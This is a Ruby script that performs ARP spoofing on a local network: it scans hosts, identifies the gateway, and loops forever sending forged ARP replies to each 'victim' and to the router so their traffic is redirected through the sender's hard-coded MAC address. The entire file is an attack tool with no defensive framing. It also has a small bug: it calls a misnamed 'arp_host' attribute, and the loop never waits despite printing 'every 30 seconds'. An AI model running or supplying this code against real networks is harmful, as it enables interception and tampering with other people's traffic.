
require 'packetfu'
require 'arp_scan'
require 'socket'

class IPTools

  attr_reader :arp_hosts
  attr_reader :gateway
  attr_reader :my_ip
  attr_reader :my_mac
  
  def initialize()
    @arp_hosts = ARPScan('--localnet').hosts
    @gateway = @arp_hosts.delete_at(@arp_hosts.find_index {|host| host.ip_addr == `ip route show`[/default.*/][/\d+\.\d+\.\d+\.\d+/]})
    @my_ip = get_my_ip()
    @my_mac = '80:19:34:80:e8:00'
  end

  def same_subnet?(ip1, ip2)
    ip1 = ip1.split '.'
    ip2 = ip2.split '.'
    same = true
    3.times do |i|
      unless ip1[i] == ip2[i]
        same = false
      end
    end
    same
  end

  private
  def get_my_ip()
    my_ip = nil
    Socket.ip_address_list.each do |local|
      @arp_hosts.each do |arp|
        if same_subnet? arp.ip_addr, local.ip_address
          my_ip = local.ip_address
        end
      end
    end
    return my_ip
  end
end

tools = IPTools.new 

puts "My IP: #{tools.my_ip}"
puts "My MAC: #{tools.my_mac}"

puts "Gateway IP: #{tools.gateway.ip_addr}"

puts 'ARP IPs'
tools.arp_hosts.each {|x| puts "IP: #{x.ip_addr}\tOUI: #{x.oui}"}

threads = []

puts "Sending ARP Packet Spoof Every 30 Seconds…"

while true
  tools.arp_host.each do |host|
    # Build Ethernet header
    arp_packet_victim = PacketFu::ARPPacket.new
    arp_packet_victim.eth_saddr = tools.my_mac              # our MAC address
    arp_packet_victim.eth_daddr = host.mac       # the victim's MAC address
    # Build ARP Packet
    arp_packet_victim.arp_saddr_mac = tools.my_mac   # our MAC address
    arp_packet_victim.arp_daddr_mac = host.mac   # the victim's MAC address
    arp_packet_victim.arp_saddr_ip = tools.gateway.ip_addr          # the router's IP
    arp_packet_victim.arp_daddr_ip = host.ip_addr         # the victim's IP
    arp_packet_victim.arp_opcode = 2                        # arp code 2 == ARP reply

    # Build Ethernet header
    arp_packet_router = PacketFu::ARPPacket.new
    arp_packet_router.eth_saddr = tools.my_mac       # our MAC address
    arp_packet_router.eth_daddr = tools.gateway.mac       # the router's MAC address
    # Build ARP Packet
    arp_packet_router.arp_saddr_mac = tools.my_mac   # our MAC address
    arp_packet_router.arp_daddr_mac = tools.gateway.mac   # the router's MAC address
    arp_packet_router.arp_saddr_ip = host.ip_addr         # the victim's IP
    arp_packet_router.arp_daddr_ip = tools.gateway.ip_addr          # the router's IP
    arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

    puts "[+] Sending ARP packet to victim: #{arp_packet_victim.arp_daddr_ip}"
    arp_packet_victim.to_w(ARGV[0])
    puts "[+] Sending ARP packet to router: #{arp_packet_router.arp_daddr_ip}"
    arp_packet_router.to_w(ARGV[0])
  end
end
